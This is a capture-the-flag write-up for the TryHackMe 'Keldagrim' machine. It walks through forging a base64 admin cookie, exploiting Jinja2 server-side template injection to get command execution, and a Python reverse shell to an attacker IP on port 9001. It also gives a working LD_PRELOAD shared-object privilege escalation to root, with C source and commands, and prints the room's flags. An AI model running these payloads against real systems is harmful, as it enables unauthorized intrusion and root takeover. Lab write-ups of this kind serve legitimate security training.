> Keldagrim

# Nmap

nmap -sC -sV -T4 -Pn -vv -A $IP -oN nmap/initial

```
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-cookie-flags: 
|   /: 
|     session: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
|_http-title:  Home page
```

And when we look at the cookie in Chrome Dev Tools, we can find that it is Base64 encoded and on decoding it we got `guest`. So let's encode admin and put it in the cookie. And we are in as admin and got another cookie `sales`. On decoding it we can find that it is the amount value. Let's try to encode a string and encode it as base64 and put in in `sales` cookie and it is reflected as such. I don't know any such exploits to put in the cookie value and nothing worked like SQLi.

So let's move onto research. What is “werkzeug”? 

A WSGI for Python. **REFERENCE:https://palletsprojects.com/p/werkzeug.** Also looking through hacktricjs we get a hint that `Probably if you are playing a CTF a Flask application will be related to SSTI.` And searching for paylods in payloadallthethings we got `{{7*'7'}}` and we got the output `7777777`. So we got Server Side Template Injection.

And we got a payload from Payload All The Things and modified it a bit.

{{"".__class__.__mro__[1].__subclasses__()}}

To exploit the SSTI to run shell commands a payload string will be built:
1. an empty string, {{“”.__class__.mro__}} will return a tuple: `(<class ‘str’>,<class ‘object’>)`
2. The root object class can be selected with `[1]` (selecting second item in python list)
3. A list of object subclasses can be listed with .subclasses().  There are over 400!

And we can find SubProcess.Popen in here. And now let's try to use this popen. Again payloadallthethings gives us a  RCE payload.

{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

And wow!! we got a RCE! Let's try to get a shell! Let's pick a python reverse shell.

`{{config.__class__.__init__.__globals__['os'].popen('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.8.107.21\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'').read()}}`

And we are in as Jed.

# user.txt

```
thm{d55ac4d0a728741d7b8c23b999e73cf3}
```

# Privilege Escalation

sudo -l

```
Matching Defaults entries for jed on keldagrim:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User jed may run the following commands on keldagrim:
    (ALL : ALL) NOPASSWD: /bin/ps
```

And ps doesn't have any exploits in GTFO. And another part is interesting `env_keep+=LD_PRELOAD`

**Reference: https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/**

# Steps

1. cd /tmp && nano shell.c

## shell.c

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

2. gcc -fPIC -shared -o shell.so -nostartfiles shell.c
3. sudo LD_PRELOAD=/tmp/shell.so ps

And we are root!

# root.txt

```
thm{bf2a087f833b58df233c0f24eac3aec5}
```